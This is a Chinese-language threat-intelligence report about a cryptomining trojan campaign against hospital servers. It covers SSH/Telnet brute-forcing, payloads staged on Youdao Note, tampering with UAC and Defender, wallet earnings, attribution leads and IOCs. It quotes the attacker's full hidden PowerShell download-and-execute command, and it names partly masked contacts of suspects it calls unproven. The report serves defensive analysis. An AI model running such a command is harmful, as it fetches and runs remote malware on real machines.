## **0x1 背景**  

**腾讯御见威胁情报中心近期检测到广东、重庆多家三甲医院服务器被黑客入侵，攻击者暴力破解医院服务器的远程登录服务，之后利用有道笔记的分享文件功能下载多种挖矿木马。**

攻击者将挖矿木马伪装成远程协助工具Teamviewer运行，攻击者的挖矿木马会检测多达50个常用挖矿程序的进程，将这些程序结束进程后独占服务器资源挖矿。该挖矿木马还会通过修改注册表，破坏操作系统安全功能：禁用UAC（用户帐户控制）、禁用Windows
Defender，关闭运行危险程序时的打开警告等等。

已知样本分析发现，攻击者使用的挖矿木马拥有多个矿池，开挖的山寨加密币包括：门罗币（XMR）、以太坊（ETH）、零币（ZEC）等等，从矿池信息看，目前攻击者已累积获利达40余万元人民币。

腾讯御见威胁情报中心已发现有关病毒作者的线索，这位挖矿木马的控制者使用同一个ID在各类黑客论坛、开发者论坛活跃时间长达十年以上。

据腾讯御见威胁情报中心统计分析，我国医疗机构开放远程登录服务（端口号：22）的比例高达50%，这意味着有一半的服务器可能遭遇相同的攻击。

##  **0x2 详细分析**

###  **0x2.1 传播方式**

![1.png](https://image.3001.net/images/20180724/15323996091352.png!small)

木马攻击流程

22端口提供ssh隧道连接服务；23端口主要用于Telnet（远程登录）服务，是Internet上普遍采用的登录和仿真程序，由于一些管理员的安全意识薄弱，设置密码简单容易猜解，导致黑客能够通过密码字典进行猜解爆破登录。

入侵成功后利用powershell下载挖矿木马母体s.exe，命令行：

    
    
    powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('http://t.cn/RdBAka2','C:\Users\Public\s.exe');[System.Diagnostics.Process]::Start('C:\Users\Public\s.exe')

hxxp://t.cn/RdBAka2是短链接，对应实际的地址为：

    
    
    hxxp://note.youdao.com/yws/public/resource/42f8bf644b487698527e48abaeb5b1f1/xmlnote/1B81E7513E0341ADAEC4F7184D56E22B/208 

然后利用网易有道云笔记的文件分享功能来进一步下载木马，可以看到该地址上存放了大量的木马。

![2.png](https://image.3001.net/images/20180724/15323996397272.png!small)

###  **0x2.2 母体s.exe**

访问有道云笔记接口

    
    
    hxxp://note.youdao.com/yws/public/note/c8c088c27a169f54ecc00864bff300fc?keyfrom=public

获取木马下载地址

    
    
    hxxp://note.youdao.com/yws/public/resource/e5b312333e8618e25badf7863ac8de0f/xmlnote/B811A461208843FAB6762B99FEA4965A/172

![3.png](https://image.3001.net/images/20180724/15323996669036.png!small)

下载挖矿木马svchost.exe

![4.png](https://image.3001.net/images/20180724/15323996903121.png!small)

启动挖矿木马

![5.png](https://image.3001.net/images/20180724/15323997081251.png!small)

###  **0x2.3 挖矿木马**

 **0x2.3.1 自保护**

关闭UAC提示

![6.png](https://image.3001.net/images/20180724/15323997358443.png!small)

修改管理员批准提示

![7.png](https://image.3001.net/images/20180724/15323997499133.png!small)

去掉bat、exe、reg、vbs、chm等文件的打开时警告

![8.png](https://image.3001.net/images/20180724/15323997709285.png!small)

禁用Windows Defender

![9.png](https://image.3001.net/images/20180724/15323997902438.png!small)

**0x2.3.2 挖矿**

木马采用开源挖矿程序xmrig编译，版本为2.6.0

![10.png](https://image.3001.net/images/20180724/1532399811456.png!small)

从地址hxxp://s.logv586.cc/更新木马

![11.png](https://image.3001.net/images/20180724/15323998303369.png!small)

更新的挖矿木马伪装成Teamviewer.exe程序的图标以及文件名

![12.png](https://image.3001.net/images/20180724/15323998492642.png!small)

并且将木马藏身在music等文档目录下

![13.png](https://image.3001.net/images/20180724/15323998636154.png!small)

木马在挖矿前结束其他挖矿进程，争夺中招机器上的的计算资源。结束挖矿进程列表如下。

>
> EthDcrMiner64.exe、eth.exe、eth11.exe、NMiner.exe、ETHSC.exe、miner.exe、ethdcr.exe、ccminer.exe、NiceHashMinerLegacy.exe、ZecMiner64.exe、DaggerGpuMiner.exe、xmrig.exe、VaalEth64.exe、zm.exe、ethminer.exe、ccminer-x64-75.exe、bfgminer.exe、ccminer-x64.exe、ethminer117.exe、cast_xmr-> vega.exe、miner64.exe、enemy.exe、etherdisk-miner.exe、xmr-stak-> amd.exe、NsGpuCNMiner.exe、xmrig-amd.exe、lolMiner-> mnx.exe、ChinaMiner.exe、挖矿专家.exe、marsminer.exe、bminer.exe、excavator.exe、PhoenixMiner.exe、ethsafe.dat、MinerMaster.exe、ccminerAlexis78.exe、minerd.exe、长沙-> 矿工ETH-SC双挖.exe、长沙-矿工A卡V5.6.exe、长沙-> 矿工N卡ZECV1.032.1.6（N卡0.3.2b内核）.exe、eth&etc挖矿.exe、中国掘金者.exe、NiceHashMiner.exe、Miner.exe、client.exe、AwesomeMiner.RemoteAgent.exe、11.6.exe、10.2eth&etc挖矿.exe、EthControl.exe、MaxBai挖矿伴侣（整合版）.exe、富矿矿工.exe、Optiminer.exe  
>

![14.png](https://image.3001.net/images/20180724/15323998813561.png!small)

检测Taskmgr.exe，若存在该进程则停止挖矿。

![15.png](https://image.3001.net/images/20180724/153239989571.png!small)

 **0x2.3.3 收益**

挖矿进程伪装成系统进程svchost的相似名svchsot

![16.png](https://image.3001.net/images/20180724/15323999136647.png!small)

> 矿池：xmr.f2pool.com
>
>
> 钱包1：4LYWaNAqVLsD2BoEqi64szTFV64R8xz7QPhxgHFeDrrPU5nii5uWGXh128UUYXayQHFUrjojugSByAyf2VHatc9gL72XXnP8gjwSQrhZMn

![17.png](https://image.3001.net/images/20180724/15323999335359.png!small)

> 矿池：xmr.f2pool.com
>
>
> 钱包2：4LYWaNAqVLsD2BoEqi64szTFV64R8xz7QPhxgHFeDrrPU5nii5uWGXh128UUYXayQHFUrjojugSByAyf2VHatc9gLDtn6LAmyhbCFFfuWB

![18.png](https://image.3001.net/images/20180724/15323999531821.png!small)![19.png](https://image.3001.net/images/20180724/15323999627686.png!small)

> 矿池：eth.f2pool.com
>
> 钱包3：0xd20685b3f6B641898cdfe7b02CBfa8Bd9D8Ec214

![20.png](https://image.3001.net/images/20180724/15323999834591.png!small)![21.png](https://image.3001.net/images/20180724/15324000011355.png!small)

> 矿池：zec.f2pool.com
>
> 钱包4：t1Rj1ZmR1x1tFm48fcQ9SLPgkiNBMJzZvFZ

![22.png](https://image.3001.net/images/20180724/15324000232417.png!small)![23.jpg](https://image.3001.net/images/20180724/1532400033873.jpg!small)

综合各个钱包信息累计挖矿已获得收益40余万元人民币。

![24.png](https://image.3001.net/images/20180724/15324000505718.png!small)

##  **0x3 黑客画像**

###  **0x3.1 钱包**

在其中一个挖矿木马中发现一个donate钱包，该钱包在此木马挖矿运行时没有被使用。42jgiScVMgMGkYSCfCFngpZHmuuBBzQ58fSGTiY3zPe4KnsMMHbj6oXKoVFHqbrPYNa2mqq9uZsuecYcmeC8TP4m9YRY9sr

![25.png](https://image.3001.net/images/20180724/15324000708302.png!small)

搜索这个钱包，发现在网上唯一记录是在百度贴吧中。有贴吧用户投诉某挖矿软件提供者LuckerBD(贴吧号)提供了带有后门的挖矿软件，而该“后门钱包”正是木马代码中包含的donate钱包。

![26.png](https://image.3001.net/images/20180724/15324001169998.png!small)

找到LuckerBD提供的挖矿程序下载地址下载得到门罗币挖矿程序

![27.png](https://image.3001.net/images/20180724/15324001504452.png!small)

其挖矿配置文件congfig.json中包含该“后门钱包”，但在教程中有说明该钱包需要替换成自己的。

![28.png](https://image.3001.net/images/20180724/15324001899829.png!small)

目前不能证明该贴吧用户LuckerBD（QQ:256*****）与此次挖矿攻击的直接关系，但不排除其提供相关程序以及参与制作的可能。

###  **0x3.2 论坛信息**

在代码中发现了有关某论坛dult.cn的代码以及url记录

![29.png](https://image.3001.net/images/20180724/15324002153415.png!small)

还包括论坛相关人员QQ：2580*****、1224******

![30-1.png](https://image.3001.net/images/20180724/15324002336202.png!small)

目前不能证明论坛以及QQ对应人员参与了此次挖矿攻击，但不排除提供了相关程序或技术支持的可能。

###  **0x3.3 邮箱**

在木马使用的另一个矿池帐号中发现了邮箱地址lb63*****@hotmail.com。该帐号在minergate网站注册后进行挖矿，而在该网站注册时需使用真实有效的邮箱地址，所以邮箱lb63*****@hotmail.com有可能是木马作者的。

![31.png](https://image.3001.net/images/20180724/15324002747963.png!small)

搜索发现该邮箱帐号对应的名称lb63*****在各类黑客、开发者论坛有大量记录，时间跨度从2008年到2018年。

![30-2.png](https://image.3001.net/images/20180724/15324002944925.png!small)

lb63*****在漏洞银行的记录。

![33.png](https://image.3001.net/images/20180724/15324003215957.png!small)

在cctry.com(VC驿站)发现lb63*****是河南用户

![34.png](https://image.3001.net/images/20180724/15324003419128.png!small)

在bbs.125.la（精益论坛）发现lb63*****使用的QQ号1002*****

![35-1.png](https://image.3001.net/images/20180724/15324003625986.png!small)

QQ1002*****信息地址也显示为河南。

![36.png](https://image.3001.net/images/20180724/15324004023486.png!small)

##  **0x4 关联分析**

跟踪分析发现被入侵的设备IP网段比较集中，特别是113.*网段存在大量被入侵的机器，
例如被攻击的广州市某人民医院、广州市某大学附属医院、重庆某儿童医院、天津某大学等等，这些机构的设备都处于113.*网段，而这些机器上又都开放有22、23等端口。

因此推测黑客入侵通过批量扫描发现网络上存在易受攻击的机器，然后进行端口爆破入侵并植入了挖矿木马。目前发现该挖矿木马主要感染地区前三依次为江苏、上海、广东。

![37.png](https://image.3001.net/images/20180724/15324004199872.png!small)

##  **0x5 安全建议**

1.加固服务器，修补服务器安全漏洞。使用安全的密码策略，使用高强度密码，切勿使用弱口令，防止黑客暴力破解。

2.如果不常使用可关闭22、23等易受攻击的端口。

3.使用腾讯御知网络空间风险雷达（网址：<https://s.tencent.com/product/yuzhi/index.html>）进行风险扫描和站点监控。

4.网站管理员可使用腾讯云网站管家智能防护平台（网址：<https://s.tencent.com/product/wzgj/index.html>），该系统具备Web入侵防护，0Day漏洞补丁修复等多纬度防御策略，可全面保护网站系统安全。

5.检查进程中是否存在Teamviewer.exe，如果网管并未使用该远程管理工具，而进程中存在，表示已经中招，企业用户推荐使用腾讯御点终端安全管理系统（<https://s.tencent.com/product/yd/index.html>）查杀。

##  ** **0x6** IOCs**

###  **域名**

> s.logv586.cc
>
> s.sock5.co
>
> g.sock5.co

###  **URL**

> hxxp://s.logv586.cc/1.txt
>
> hxxp://s.logv586.cc/2.txt
>
> hxxp://s.logv586.cc/update1.exe
>
> hxxp://s.sock5.co:8089/eth/0508/kill.txt
>
> hxxp://s.sock5.co:8087/eth/yx3/lin.asp?&a=csxf&ser=
>
> hxxp://s.sock5.co:8089/eth/0508/name.txt
>
> hxxp://s.sock5.co:8087/menluo/1.png
>
> hxxp://s.sock5.co:8087/menluo/2.png
>
>
> hxxp://note.youdao.com/yws/public/note/c8c088c27a169f54ecc00864bff300fc?keyfrom=public
>
>
> hxxp://note.youdao.com/yws/public/note/6038b28fea954435260f1f49b8700fbd?keyfrom=public
>
>
> hxxp://note.youdao.com/yws/public/resource/42f8bf644b487698527e48abaeb5b1f1/xmlnote/1B81E7513E0341ADAEC4F7184D56E22B/208
>
>
> hxxp://note.youdao.com/yws/public/resource/42f8bf644b487698527e48abaeb5b1f1/xmlnote/123C970B749E41DABC4F49669EFCDDF4/105
>
>
> hxxp://note.youdao.com/yws/public/resource/a365f4dc4f18be9fd6cfe8d3e657ac19/xmlnote/F1CCE56966A8481D98C87104B36D216A/165
>
>
> hxxp://note.youdao.com/yws/public/resource/353fa4934376046777e3ba97ae1d530e/xmlnote/080B33DC6C124250A343E0ED57E96427/163
>
>
> hxxp://note.youdao.com/yws/public/resource/c7003500e91d08b776585d7b57758607/xmlnote/17BA9DA052DC4CE48DEC28ED756775F9/168
>
>
> hxxp://note.youdao.com/yws/public/resource/7ac6d30ee18a2f55405faa438035695a/xmlnote/A28B488699F448C9A9C9EB7343FA89AE/152
>
>
> hxxp://note.youdao.com/yws/public/resource/4783e051988fb0eff8cf383200c536f1/xmlnote/A28B12E6FEE94255B0DA557BE74EE00D/155
>
>
> hxxp://note.youdao.com/yws/public/resource/33dfd1aa0be86a4fe84be3843f47f1b5/xmlnote/4403BF98162E42748698AE379B5391FF/158
>
>
> hxxp://note.youdao.com/yws/public/resource/e5b312333e8618e25badf7863ac8de0f/xmlnote/B811A461208843FAB6762B99FEA4965A/172
>
>
> hxxp://note.youdao.com/yws/public/resource/c438575278e9960ccc2b1641b430be8e/xmlnote/1099078ED4224078ADACA3FBDF0DA2A9/176

###  **矿池-钱包**

> xmr.f2pool.com
>
>
> 4LYWaNAqVLsD2BoEqi64szTFV64R8xz7QPhxgHFeDrrPU5nii5uWGXh128UUYXayQHFUrjojugSByAyf2VHatc9gL72XXnP8gjwSQrhZMn
>
> xmr.f2pool.com
>
>
> 4LYWaNAqVLsD2BoEqi64szTFV64R8xz7QPhxgHFeDrrPU5nii5uWGXh128UUYXayQHFUrjojugSByAyf2VHatc9gLDtn6LAmyhbCFFfuWB
>
> zec.f2pool.com t1Rj1ZmR1x1tFm48fcQ9SLPgkiNBMJzZvFZ
>
> eth.f2pool.com 0xd20685b3f6B641898cdfe7b02CBfa8Bd9D8Ec214

###  **Md5**

> f4bae88610da798f9e3669a9db002643
>
> aea15475e5554ce412ae96e4a89565de
>
> d255f8e52020606ce118d43503762ab4
>
> 413658168e476eb02373907954181f58
>
> b1f1eef4f2e4a50428f426efb7c767ef
>
> 35154485d43d421be7b81d2100fb9e4a
>
> cc2430273474cba1f6bdbff5f0319826
>
> fe6c9b84934295ffa3903bbdf13de7d5
>
> f806b54c1306c054a623188bc7523ad4
>
> 6cb9aa4e5cc730805deb4fd1a0038398
>
> c09d0d4d2d0386c90f0dd1f994b246c5
>
> f4b3e335011de366a01ce711b29c147d
>
> 6149e53a77f4b0af0bcd015c862f3748
>
> a87a7d4cb1d709d8ac0fe7fb26603c96
>
> 11b16372746c70b8a16ea7527789483a
>
> e036dbd652426927b31cd1c11692f9fb
>
> 354878bfaed1ff3ed393359653673a16
>
> 9281aafc34c6488d032cdce379a55cd7

 ***本文作者：腾讯御见威胁情报中心，转载请注明来自FreeBuf.COM**

